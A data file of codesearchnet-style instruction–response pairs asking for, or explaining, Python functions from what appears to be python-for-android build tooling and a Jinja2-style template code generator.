{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfind the topological order of the items in the dependency graph.", "response": "def find_order(graph):\n    '''\n    Do a topological sort on the dependency graph dict.\n    '''\n    while graph:\n        # Find all items without a parent\n        leftmost = [l for l, s in graph.items() if not s]\n        if not leftmost:\n            raise ValueError('Dependency cycle detected! %s' % graph)\n        # If there is more than one, sort them for predictable order\n        leftmost.sort()\n        for result in leftmost:\n            # Yield and remove them from the graph\n            yield result\n            graph.pop(result)\n            for bset in graph.values():\n                bset.discard(result)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef obvious_conflict_checker(ctx, name_tuples, blacklist=None):\n    deps_were_added_by = dict()\n    deps = set()\n    if blacklist is None:\n        blacklist = set()\n\n    # Add dependencies for all recipes:\n    to_be_added = [(name_tuple, None) for name_tuple in name_tuples]\n    while len(to_be_added) > 0:\n        current_to_be_added = list(to_be_added)\n        to_be_added = []\n        for (added_tuple, adding_recipe) in current_to_be_added:\n            assert(type(added_tuple) == tuple)\n            if len(added_tuple) > 1:\n                # No obvious commitment in what to add, don't check it itself\n                # but throw it into deps for later comparing against\n                # (Remember this function only catches obvious issues)\n                deps.add(added_tuple)\n                continue\n\n            name = added_tuple[0]\n            recipe_conflicts = set()\n            recipe_dependencies = []\n            try:\n                # Get recipe to add and who's ultimately adding it:\n                recipe = Recipe.get_recipe(name, ctx)\n                recipe_conflicts = {c.lower() for c in recipe.conflicts}\n                recipe_dependencies = get_dependency_tuple_list_for_recipe(\n                    recipe, blacklist=blacklist\n                )\n            except ValueError:\n                pass\n            adder_first_recipe_name = adding_recipe or name\n\n            # Collect the conflicts:\n            triggered_conflicts = []\n            for dep_tuple_list in deps:\n                # See if the new deps conflict with things added before:\n                if set(dep_tuple_list).intersection(\n                       recipe_conflicts) == set(dep_tuple_list):\n                    triggered_conflicts.append(dep_tuple_list)\n                    continue\n\n                # See if what was added before conflicts with the new deps:\n                if len(dep_tuple_list) > 1:\n                    # Not an obvious commitment to a specific recipe/dep\n                    # to be added, so we won't check.\n                    # (remember this function only catches obvious issues)\n                    continue\n                try:\n                    dep_recipe = Recipe.get_recipe(dep_tuple_list[0], ctx)\n                except ValueError:\n                    continue\n                conflicts = [c.lower() for c in dep_recipe.conflicts]\n                if name in conflicts:\n                    triggered_conflicts.append(dep_tuple_list)\n\n            # Throw error on conflict:\n            if triggered_conflicts:\n                # Get first conflict and see who added that one:\n                adder_second_recipe_name = \"'||'\".join(triggered_conflicts[0])\n                second_recipe_original_adder = deps_were_added_by.get(\n                    (adder_second_recipe_name,), None\n                )\n                if second_recipe_original_adder:\n                    adder_second_recipe_name = second_recipe_original_adder\n\n                # Prompt error:\n                raise BuildInterruptingException(\n                    \"Conflict detected: '{}'\"\n                    \" inducing dependencies {}, and '{}'\"\n                    \" inducing conflicting dependencies {}\".format(\n                        adder_first_recipe_name,\n                        (recipe.name,),\n                        adder_second_recipe_name,\n                        triggered_conflicts[0]\n                    ))\n\n            # Actually add it to our list:\n            deps.add(added_tuple)\n            deps_were_added_by[added_tuple] = adding_recipe\n\n            # Schedule dependencies to be added\n            to_be_added += [\n                (dep, adder_first_recipe_name or name)\n                for dep in recipe_dependencies\n                if dep not in deps\n            ]\n    # If we came here, then there were no obvious conflicts.\n    return None", "response": "This function is a pre - flight check function that will just ignore the recipe order and just check if any of the dependencies that conflict with the current one."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a string with the include folders", "response": "def include_flags(self, arch):\n        '''Returns a string with the include folders'''\n        openssl_includes = join(self.get_build_dir(arch.arch), 'include')\n        return (' -I' + openssl_includes +\n                ' -I' + join(openssl_includes, 'internal') +\n                ' -I' + join(openssl_includes, 'openssl'))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ntaking care to properly link libraries with python depending on our requirements and the attribute opt_depends.", "response": "def set_libs_flags(self, env, arch):\n        '''Takes care to properly link libraries with python depending on our\n        requirements and the attribute :attr:`opt_depends`.\n        '''\n        def add_flags(include_flags, link_dirs, link_libs):\n            env['CPPFLAGS'] = env.get('CPPFLAGS', '') + include_flags\n            env['LDFLAGS'] = env.get('LDFLAGS', '') + link_dirs\n            env['LIBS'] = env.get('LIBS', '') + link_libs\n\n        if 'sqlite3' in self.ctx.recipe_build_order:\n            info('Activating flags for sqlite3')\n            recipe = Recipe.get_recipe('sqlite3', self.ctx)\n            add_flags(' -I' + recipe.get_build_dir(arch.arch),\n                      ' -L' + recipe.get_lib_dir(arch), ' -lsqlite3')\n\n        if 'libffi' in self.ctx.recipe_build_order:\n            info('Activating flags for libffi')\n            recipe = Recipe.get_recipe('libffi', self.ctx)\n            # In order to force the correct linkage for our libffi library, we\n            # set the following variable to point where is our libffi.pc file,\n            # because the python build system uses pkg-config to configure it.\n            env['PKG_CONFIG_PATH'] = recipe.get_build_dir(arch.arch)\n            add_flags(' -I' + ' -I'.join(recipe.get_include_dirs(arch)),\n                      ' -L' + join(recipe.get_build_dir(arch.arch), '.libs'),\n                      ' -lffi')\n\n        if 'openssl' in self.ctx.recipe_build_order:\n            info('Activating flags for openssl')\n            recipe = Recipe.get_recipe('openssl', self.ctx)\n            add_flags(recipe.include_flags(arch),\n                      recipe.link_dirs_flags(arch), recipe.link_libs_flags())\n        return env"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef compile_python_files(self, dir):\n        '''\n        Compile the python files (recursively) for the python files inside\n        a given folder.\n\n        .. note:: python2 compiles the files into extension .pyo, but in\n            python3, and as of Python 3.5, the .pyo filename extension is no\n            longer used...uses .pyc (https://www.python.org/dev/peps/pep-0488)\n        '''\n        args = [self.ctx.hostpython]\n        if self.ctx.python_recipe.name == 'python3':\n            args += ['-OO', '-m', 'compileall', '-b', '-f', dir]\n        else:\n            args += ['-OO', '-m', 'compileall', '-f', dir]\n        subprocess.call(args)", "response": "Compile the python files inside a given folder."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef create_python_bundle(self, dirn, arch):\n        # Todo: find a better way to find the build libs folder\n        modules_build_dir = join(\n            self.get_build_dir(arch.arch),\n            'android-build',\n            'build',\n            'lib.linux{}-{}-{}'.format(\n                '2' if self.version[0] == '2' else '',\n                arch.command_prefix.split('-')[0],\n                self.major_minor_version_string\n            ))\n\n        # Compile to *.pyc/*.pyo the python modules\n        self.compile_python_files(modules_build_dir)\n        # Compile to *.pyc/*.pyo the standard python library\n        self.compile_python_files(join(self.get_build_dir(arch.arch), 'Lib'))\n        # Compile to *.pyc/*.pyo the other python packages (site-packages)\n        self.compile_python_files(self.ctx.get_python_install_dir())\n\n        # Bundle compiled python modules to a folder\n        modules_dir = join(dirn, 'modules')\n        c_ext = self.compiled_extension\n        ensure_dir(modules_dir)\n        module_filens = (glob.glob(join(modules_build_dir, '*.so')) +\n                         glob.glob(join(modules_build_dir, '*' + c_ext)))\n        info(\"Copy {} files into the bundle\".format(len(module_filens)))\n        for filen in module_filens:\n            info(\" - copy {}\".format(filen))\n            copy2(filen, modules_dir)\n\n        # zip up the standard library\n        stdlib_zip = join(dirn, 'stdlib.zip')\n        with current_directory(join(self.get_build_dir(arch.arch), 'Lib')):\n            stdlib_filens = list(walk_valid_filens(\n                '.', self.stdlib_dir_blacklist, self.stdlib_filen_blacklist))\n            info(\"Zip {} files into the bundle\".format(len(stdlib_filens)))\n            shprint(sh.zip, stdlib_zip, *stdlib_filens)\n\n        # copy the site-packages into place\n        ensure_dir(join(dirn, 'site-packages'))\n        ensure_dir(self.ctx.get_python_install_dir())\n        # TODO: Improve the API around walking and copying the files\n        with current_directory(self.ctx.get_python_install_dir()):\n            filens = list(walk_valid_filens(\n                '.', self.site_packages_dir_blacklist,\n                self.site_packages_filen_blacklist))\n            info(\"Copy {} files into the site-packages\".format(len(filens)))\n            for filen in filens:\n                info(\" - copy {}\".format(filen))\n                ensure_dir(join(dirn, 'site-packages', dirname(filen)))\n                copy2(filen, join(dirn, 'site-packages', filen))\n\n        # copy the python .so files into place\n        python_build_dir = join(self.get_build_dir(arch.arch),\n                                'android-build')\n        python_lib_name = 'libpython' + self.major_minor_version_string\n        if self.major_minor_version_string[0] == '3':\n            python_lib_name += 'm'\n        shprint(sh.cp, join(python_build_dir, python_lib_name + '.so'),\n                join(self.ctx.dist_dir, self.ctx.dist_name, 'libs', arch.arch))\n\n        info('Renaming .so files to reflect cross-compile')\n        self.reduce_object_file_names(join(dirn, 'site-packages'))\n\n        return join(dirn, 'site-packages')", "response": "Create a packaged python bundle in the target directory by copying all the modules and standard library into the right python bundle."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_recipe_env(self, arch, with_flags_in_cc=True):\n        env = super(ScryptRecipe, self).get_recipe_env(arch, with_flags_in_cc)\n        openssl_recipe = self.get_recipe('openssl', self.ctx)\n        env['CFLAGS'] += openssl_recipe.include_flags(arch)\n        env['LDFLAGS'] += ' -L{}'.format(self.ctx.get_libs_dir(arch.arch))\n        env['LDFLAGS'] += ' -L{}'.format(self.ctx.libs_dir)\n        env['LDFLAGS'] += openssl_recipe.link_dirs_flags(arch)\n        env['LIBS'] = env.get('LIBS', '') + openssl_recipe.link_libs_flags()\n        return env", "response": "Adds openssl recipe to include and library path."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef walk_valid_filens(base_dir, invalid_dir_names, invalid_file_patterns):\n\n    for dirn, subdirs, filens in walk(base_dir):\n\n        # Remove invalid subdirs so that they will not be walked\n        for i in reversed(range(len(subdirs))):\n            subdir = subdirs[i]\n            if subdir in invalid_dir_names:\n                subdirs.pop(i)\n\n        for filen in filens:\n            for pattern in invalid_file_patterns:\n                if fnmatch(filen, pattern):\n                    break\n            else:\n                yield join(dirn, filen)", "response": "Recursively walks all the files and directories in dirn ignoring any pattern in invalid_dir_names and invalid_file_patterns."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef handle_build_exception(exception):\n    error('Build failed: {}'.format(exception.message))\n    if exception.instructions is not None:\n        info('Instructions: {}'.format(exception.instructions))\n    exit(1)", "response": "Handles a BuildInterruptingException by printing its error\n    message and associated instructions."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nusing jinja2 render template to the filename dest supplying the keyword arguments as template parameters.", "response": "def render(template, dest, **kwargs):\n    '''Using jinja2, render `template` to the filename `dest`, supplying the\n\n    keyword arguments as template parameters.\n    '''\n\n    dest_dir = dirname(dest)\n    if dest_dir and not exists(dest_dir):\n        makedirs(dest_dir)\n\n    template = environment.get_template(template)\n    text = template.render(**kwargs)\n\n    f = open(dest, 'wb')\n    f.write(text.encode('utf-8'))\n    f.close()"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a zip file containing all the python related files.", "response": "def make_python_zip():\n    '''\n    Search for all the python related files, and construct the pythonXX.zip\n    According to\n    # http://randomsplat.com/id5-cross-compiling-python-for-embedded-linux.html\n    site-packages, config and lib-dynload will be not included.\n    '''\n\n    if not exists('private'):\n        print('No compiled python is present to zip, skipping.')\n        return\n\n    global python_files\n    d = realpath(join('private', 'lib', 'python2.7'))\n\n    def select(fn):\n        if is_blacklist(fn):\n            return False\n        fn = realpath(fn)\n        assert(fn.startswith(d))\n        fn = fn[len(d):]\n        if (fn.startswith('/site-packages/')\n                or fn.startswith('/config/')\n                or fn.startswith('/lib-dynload/')\n                or fn.startswith('/libpymodules.so')):\n            return False\n        return fn\n\n    # get a list of all python file\n    python_files = [x for x in listfiles(d) if select(x)]\n\n    # create the final zipfile\n    zfn = join('private', 'lib', 'python27.zip')\n    zf = ZipFile(zfn, 'w')\n\n    # put all the python files in it\n    for fn in python_files:\n        afn = fn[len(d):]\n        zf.write(fn, afn)\n    zf.close()"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nmakes a tar. gz file from the contents of source_dis.", "response": "def make_tar(tfn, source_dirs, ignore_path=[], optimize_python=True):\n    '''\n    Make a zip file `fn` from the contents of source_dis.\n    '''\n\n    # selector function\n    def select(fn):\n        rfn = realpath(fn)\n        for p in ignore_path:\n            if p.endswith('/'):\n                p = p[:-1]\n            if rfn.startswith(p):\n                return False\n        if rfn in python_files:\n            return False\n        return not is_blacklist(fn)\n\n    # get the files and relpath file of all the directory we asked for\n    files = []\n    for sd in source_dirs:\n        sd = realpath(sd)\n        compile_dir(sd, optimize_python=optimize_python)\n        files += [(x, relpath(realpath(x), sd)) for x in listfiles(sd)\n                  if select(x)]\n\n    # create tar.gz of thoses files\n    tf = tarfile.open(tfn, 'w:gz', format=tarfile.USTAR_FORMAT)\n    dirs = []\n    for fn, afn in files:\n        dn = dirname(afn)\n        if dn not in dirs:\n            # create every dirs first if not exist yet\n            d = ''\n            for component in split(dn):\n                d = join(d, component)\n                if d.startswith('/'):\n                    d = d[1:]\n                if d == '' or d in dirs:\n                    continue\n                dirs.append(d)\n                tinfo = tarfile.TarInfo(d)\n                tinfo.type = tarfile.DIRTYPE\n                tf.addfile(tinfo)\n\n        # put the file\n        tf.add(fn, afn)\n    tf.close()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef compile_dir(dfn, optimize_python=True):\n    '''\n    Compile *.py in directory `dfn` to *.pyo\n    '''\n\n    if PYTHON is None:\n        return\n\n    if int(PYTHON_VERSION[0]) >= 3:\n        args = [PYTHON, '-m', 'compileall', '-b', '-f', dfn]\n    else:\n        args = [PYTHON, '-m', 'compileall', '-f', dfn]\n    if optimize_python:\n        # -OO = strip docstrings\n        args.insert(1, '-OO')\n    return_code = subprocess.call(args)\n\n    if return_code != 0:\n        print('Error while running \"{}\"'.format(' '.join(args)))\n        print('This probably means one of your Python files has a syntax '\n              'error, see logs above')\n        exit(1)", "response": "Compile all. py in directory dfn to all. pyo."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates expected build and symlinks system Python version.", "response": "def build_arch(self, arch):\n        \"\"\"\n        Creates expected build and symlinks system Python version.\n        \"\"\"\n        self.ctx.hostpython = '/usr/bin/false'\n        # creates the sub buildir (used by other recipes)\n        # https://github.com/kivy/python-for-android/issues/1154\n        sub_build_dir = join(self.get_build_dir(), 'build')\n        shprint(sh.mkdir, '-p', sub_build_dir)\n        python3crystax = self.get_recipe('python3crystax', self.ctx)\n        system_python = sh.which(\"python\" + python3crystax.version)\n        if system_python is None:\n            raise OSError(\n                ('Trying to use python3crystax=={} but this Python version '\n                 'is not installed locally.').format(python3crystax.version))\n        link_dest = join(self.get_build_dir(), 'hostpython')\n        shprint(sh.ln, '-sf', system_python, link_dest)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nusing jinja2 render template to the filename dest supplying the keyword arguments as template parameters.", "response": "def render(template, dest, **kwargs):\n    '''Using jinja2, render `template` to the filename `dest`, supplying the\n\n    keyword arguments as template parameters.\n    '''\n\n    template = environment.get_template(template)\n    text = template.render(**kwargs)\n\n    f = open(dest, 'wb')\n    f.write(text.encode('utf-8'))\n    f.close()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncalculate the md5sum of a file.", "response": "def md5sum(filen):\n    '''Calculate the md5sum of a file.\n    '''\n    with open(filen, 'rb') as fileh:\n        md5 = hashlib.md5(fileh.read())\n\n    return md5.hexdigest()"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndownload an url to a target.", "response": "def download_file(self, url, target, cwd=None):\n        \"\"\"\n        (internal) Download an ``url`` to a ``target``.\n        \"\"\"\n        if not url:\n            return\n        info('Downloading {} from {}'.format(self.name, url))\n\n        if cwd:\n            target = join(cwd, target)\n\n        parsed_url = urlparse(url)\n        if parsed_url.scheme in ('http', 'https'):\n            def report_hook(index, blksize, size):\n                if size <= 0:\n                    progression = '{0} bytes'.format(index * blksize)\n                else:\n                    progression = '{0:.2f}%'.format(\n                        index * blksize * 100. / float(size))\n                if \"CI\" not in environ:\n                    stdout.write('- Download {}\\r'.format(progression))\n                    stdout.flush()\n\n            if exists(target):\n                unlink(target)\n\n            # Download item with multiple attempts (for bad connections):\n            attempts = 0\n            while True:\n                try:\n                    urlretrieve(url, target, report_hook)\n                except OSError as e:\n                    attempts += 1\n                    if attempts >= 5:\n                        raise e\n                    stdout.write('Download failed retrying in a second...')\n                    time.sleep(1)\n                    continue\n                break\n            return target\n        elif parsed_url.scheme in ('git', 'git+file', 'git+ssh', 'git+http', 'git+https'):\n            if isdir(target):\n                with current_directory(target):\n                    shprint(sh.git, 'fetch', '--tags')\n                    if self.version:\n                        shprint(sh.git, 'checkout', self.version)\n                    shprint(sh.git, 'pull')\n                    shprint(sh.git, 'pull', '--recurse-submodules')\n                    shprint(sh.git, 'submodule', 'update', '--recursive')\n            else:\n                if url.startswith('git+'):\n                    url = url[4:]\n                shprint(sh.git, 'clone', '--recursive', url, target)\n                if self.version:\n                    with current_directory(target):\n                        shprint(sh.git, 'checkout', self.version)\n                        shprint(sh.git, 'submodule', 'update', '--recursive')\n            return target"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\napplies a patch from the current recipe directory into the current currentCOOKIE build directory.", "response": "def apply_patch(self, filename, arch, build_dir=None):\n        \"\"\"\n        Apply a patch from the current recipe directory into the current\n        build directory.\n\n        .. versionchanged:: 0.6.0\n            Add ability to apply patch from any dir via kwarg `build_dir`'''\n        \"\"\"\n        info(\"Applying patch {}\".format(filename))\n        build_dir = build_dir if build_dir else self.get_build_dir(arch)\n        filename = join(self.get_recipe_dir(), filename)\n        shprint(sh.patch, \"-t\", \"-d\", build_dir, \"-p1\",\n                \"-i\", filename, _tail=10)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef filtered_archs(self):\n        '''Return archs of self.ctx that are valid build archs\n        for the Recipe.'''\n        result = []\n        for arch in self.ctx.archs:\n            if not self.archs or (arch.arch in self.archs):\n                result.append(arch)\n        return result", "response": "Return archs of self. ctx that are valid build archs\n        for the Recipe."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nchecking what recipes are being built to see which of the alternative and optional dependencies are being used and returns a list of these.", "response": "def check_recipe_choices(self):\n        '''Checks what recipes are being built to see which of the alternative\n        and optional dependencies are being used,\n        and returns a list of these.'''\n        recipes = []\n        built_recipes = self.ctx.recipe_build_order\n        for recipe in self.depends:\n            if isinstance(recipe, (tuple, list)):\n                for alternative in recipe:\n                    if alternative in built_recipes:\n                        recipes.append(alternative)\n                        break\n        for recipe in self.opt_depends:\n            if recipe in built_recipes:\n                recipes.append(recipe)\n        return sorted(recipes)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_build_container_dir(self, arch):\n        '''Given the arch name, returns the directory where it will be\n        built.\n\n        This returns a different directory depending on what\n        alternative or optional dependencies are being built.\n        '''\n        dir_name = self.get_dir_name()\n        return join(self.ctx.build_dir, 'other_builds',\n                    dir_name, '{}__ndk_target_{}'.format(arch, self.ctx.ndk_api))", "response": "Given the arch name returns the directory where it will be\n        built."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the local recipe directory or defaults to the core recipe directory.", "response": "def get_recipe_dir(self):\n        \"\"\"\n        Returns the local recipe directory or defaults to the core recipe\n        directory.\n        \"\"\"\n        if self.ctx.local_recipes is not None:\n            local_recipe_dir = join(self.ctx.local_recipes, self.name)\n            if exists(local_recipe_dir):\n                return local_recipe_dir\n        return join(self.ctx.root_dir, 'recipes', self.name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_recipe_env(self, arch=None, with_flags_in_cc=True, clang=False):\n        if arch is None:\n            arch = self.filtered_archs[0]\n        return arch.get_env(with_flags_in_cc=with_flags_in_cc, clang=clang)", "response": "Return the env specialized for the recipe\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef apply_patches(self, arch, build_dir=None):\n        '''Apply any patches for the Recipe.\n\n        .. versionchanged:: 0.6.0\n            Add ability to apply patches from any dir via kwarg `build_dir`'''\n        if self.patches:\n            info_main('Applying patches for {}[{}]'\n                      .format(self.name, arch.arch))\n\n            if self.is_patched(arch):\n                info_main('{} already patched, skipping'.format(self.name))\n                return\n\n            build_dir = build_dir if build_dir else self.get_build_dir(arch.arch)\n            for patch in self.patches:\n                if isinstance(patch, (tuple, list)):\n                    patch, patch_check = patch\n                    if not patch_check(arch=arch, recipe=self):\n                        continue\n\n                self.apply_patch(\n                        patch.format(version=self.version, arch=arch.arch),\n                        arch.arch, build_dir=build_dir)\n\n            shprint(sh.touch, join(build_dir, '.patched'))", "response": "Apply any patches for the Recipe."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef clean_build(self, arch=None):\n        '''Deletes all the build information of the recipe.\n\n        If arch is not None, only this arch dir is deleted. Otherwise\n        (the default) all builds for all archs are deleted.\n\n        By default, this just deletes the main build dir. If the\n        recipe has e.g. object files biglinked, or .so files stored\n        elsewhere, you should override this method.\n\n        This method is intended for testing purposes, it may have\n        strange results. Rebuild everything if this seems to happen.\n\n        '''\n        if arch is None:\n            base_dir = join(self.ctx.build_dir, 'other_builds', self.name)\n        else:\n            base_dir = self.get_build_container_dir(arch)\n        dirs = glob.glob(base_dir + '-*')\n        if exists(base_dir):\n            dirs.append(base_dir)\n        if not dirs:\n            warning('Attempted to clean build for {} but found no existing '\n                    'build dirs'.format(self.name))\n\n        for directory in dirs:\n            if exists(directory):\n                info('Deleting {}'.format(directory))\n                shutil.rmtree(directory)\n\n        # Delete any Python distributions to ensure the recipe build\n        # doesn't persist in site-packages\n        shutil.rmtree(self.ctx.python_installs_dir)", "response": "Deletes all the build information of the recipe."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the Recipe with the given name if it exists.", "response": "def get_recipe(cls, name, ctx):\n        '''Returns the Recipe with the given name, if it exists.'''\n        name = name.lower()\n        if not hasattr(cls, \"recipes\"):\n            cls.recipes = {}\n        if name in cls.recipes:\n            return cls.recipes[name]\n\n        recipe_file = None\n        for recipes_dir in cls.recipe_dirs(ctx):\n            if not exists(recipes_dir):\n                continue\n            # Find matching folder (may differ in case):\n            for subfolder in listdir(recipes_dir):\n                if subfolder.lower() == name:\n                    recipe_file = join(recipes_dir, subfolder, '__init__.py')\n                    if exists(recipe_file):\n                        name = subfolder  # adapt to actual spelling\n                        break\n                    recipe_file = None\n            if recipe_file is not None:\n                break\n\n        if not recipe_file:\n            raise ValueError('Recipe does not exist: {}'.format(name))\n\n        mod = import_recipe('pythonforandroid.recipes.{}'.format(name), recipe_file)\n        if len(logger.handlers) > 1:\n            logger.removeHandler(logger.handlers[1])\n        recipe = mod.recipe\n        recipe.ctx = ctx\n        cls.recipes[name.lower()] = recipe\n        return recipe"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef folder_name(self):\n        '''The name of the build folders containing this recipe.'''\n        name = self.site_packages_name\n        if name is None:\n            name = self.name\n        return name", "response": "The name of the build folders containing this recipe."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ninstalling the Python module by calling setup. py install with the target Python dir.", "response": "def build_arch(self, arch):\n        '''Install the Python module by calling setup.py install with\n        the target Python dir.'''\n        super(PythonRecipe, self).build_arch(arch)\n        self.install_python_package(arch)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef install_python_package(self, arch, name=None, env=None, is_dir=True):\n        '''Automate the installation of a Python package (or a cython\n        package where the cython components are pre-built).'''\n        # arch = self.filtered_archs[0]  # old kivy-ios way\n        if name is None:\n            name = self.name\n        if env is None:\n            env = self.get_recipe_env(arch)\n\n        info('Installing {} into site-packages'.format(self.name))\n\n        with current_directory(self.get_build_dir(arch.arch)):\n            hostpython = sh.Command(self.hostpython_location)\n\n            if self.ctx.python_recipe.name != 'python2legacy':\n                hpenv = env.copy()\n                shprint(hostpython, 'setup.py', 'install', '-O2',\n                        '--root={}'.format(self.ctx.get_python_install_dir()),\n                        '--install-lib=.',\n                        _env=hpenv, *self.setup_extra_args)\n            elif self.call_hostpython_via_targetpython:\n                shprint(hostpython, 'setup.py', 'install', '-O2', _env=env,\n                        *self.setup_extra_args)\n            else:  # python2legacy\n                hppath = join(dirname(self.hostpython_location), 'Lib', 'site-packages')\n                hpenv = env.copy()\n                if 'PYTHONPATH' in hpenv:\n                    hpenv['PYTHONPATH'] = ':'.join([hppath] + hpenv['PYTHONPATH'].split(':'))\n                else:\n                    hpenv['PYTHONPATH'] = hppath\n                shprint(hostpython, 'setup.py', 'install', '-O2',\n                        '--root={}'.format(self.ctx.get_python_install_dir()),\n                        '--install-lib=lib/python2.7/site-packages',\n                        _env=hpenv, *self.setup_extra_args)\n\n            # If asked, also install in the hostpython build dir\n            if self.install_in_hostpython:\n                self.install_hostpython_package(arch)", "response": "Automate the installation of a Python package or a Cython\n        package where the cython components are pre - built."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild any cython components then install the Python module by calling setup. py install with the target Python dir.", "response": "def build_arch(self, arch):\n        '''Build any cython components, then install the Python module by\n        calling setup.py install with the target Python dir.\n        '''\n        Recipe.build_arch(self, arch)\n        self.build_compiled_components(arch)\n        self.install_python_package(arch)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild any cython components then install the Python module by calling setup. py install with the target Python dir.", "response": "def build_arch(self, arch):\n        '''Build any cython components, then install the Python module by\n        calling setup.py install with the target Python dir.\n        '''\n        Recipe.build_arch(self, arch)\n        self.build_cython_components(arch)\n        self.install_python_package(arch)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the channel with the given number.", "response": "def Channel(n):\n    \"\"\"\n    Gets the channel with the given number.\n    \"\"\"\n\n    rv = channels.get(n, None)\n    if rv is None:\n        rv = ChannelImpl(n)\n        channels[n] = rv\n\n    return rv"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef generate(node, environment, name, filename, stream=None,\n             defer_init=False):\n    \"\"\"Generate the python source for a node tree.\"\"\"\n    if not isinstance(node, nodes.Template):\n        raise TypeError('Can\\'t compile non template nodes')\n    generator = CodeGenerator(environment, name, filename, stream, defer_init)\n    generator.visit(node)\n    if stream is None:\n        return generator.stream.getvalue()", "response": "Generate the python source for a node tree."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_special(self, name):\n        self.undeclared.discard(name)\n        self.declared.add(name)", "response": "Register a special name like loop."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef is_declared(self, name, local_only=False):\n        if name in self.declared_locally or name in self.declared_parameter:\n            return True\n        if local_only:\n            return False\n        return name in self.declared", "response": "Check if a name is declared in this or an outer scope."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a copy of the current one.", "response": "def copy(self):\n        \"\"\"Create a copy of the current one.\"\"\"\n        rv = object.__new__(self.__class__)\n        rv.__dict__.update(self.__dict__)\n        rv.identifiers = object.__new__(self.identifiers.__class__)\n        rv.identifiers.__dict__.update(self.identifiers.__dict__)\n        return rv"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef find_shadowed(self, extra=()):\n        i = self.identifiers\n        return (i.declared | i.outer_undeclared) & \\\n               (i.declared_locally | i.declared_parameter) | \\\n               set(x for x in extra if i.is_declared(x))", "response": "Find all the shadowed names."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nvisit a list of nodes as block in a frame.", "response": "def blockvisit(self, nodes, frame):\n        \"\"\"Visit a list of nodes as block in a frame.  If the current frame\n        is no buffer a dummy ``if 0: yield None`` is written automatically\n        unless the force_generator parameter is set to False.\n        \"\"\"\n        if frame.buffer is None:\n            self.writeline('if 0: yield None')\n        else:\n            self.writeline('pass')\n        try:\n            for node in nodes:\n                self.visit(node, frame)\n        except CompilerExit:\n            pass"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef pull_locals(self, frame):\n        for name in frame.identifiers.undeclared:\n            self.writeline('l_%s = context.resolve(%r)' % (name, name))", "response": "Pull all the references identifiers into the local scope."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef unoptimize_scope(self, frame):\n        # XXX: this is not that nice but it has no real overhead.  It\n        # mainly works because python finds the locals before dead code\n        # is removed.  If that breaks we have to add a dummy function\n        # that just accepts the arguments and does nothing.\n        if frame.identifiers.declared:\n            self.writeline('%sdummy(%s)' % (\n                unoptimize_before_dead_code and 'if 0: ' or '',\n                ', '.join('l_' + name for name in frame.identifiers.declared)\n            ))", "response": "Disable Python optimizations for the frame."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrestoring all aliases and delete unused variables.", "response": "def pop_scope(self, aliases, frame):\n        \"\"\"Restore all aliases and delete unused variables.\"\"\"\n        for name, alias in aliases.iteritems():\n            self.writeline('l_%s = %s' % (name, alias))\n        to_delete = set()\n        for name in frame.identifiers.declared_locally:\n            if name not in aliases:\n                to_delete.add('l_' + name)\n        if to_delete:\n            # we cannot use the del statement here because enclosed\n            # scopes can trigger a SyntaxError:\n            #   a = 42; b = lambda: a; del a\n            self.writeline(' = '.join(to_delete) + ' = missing')"}
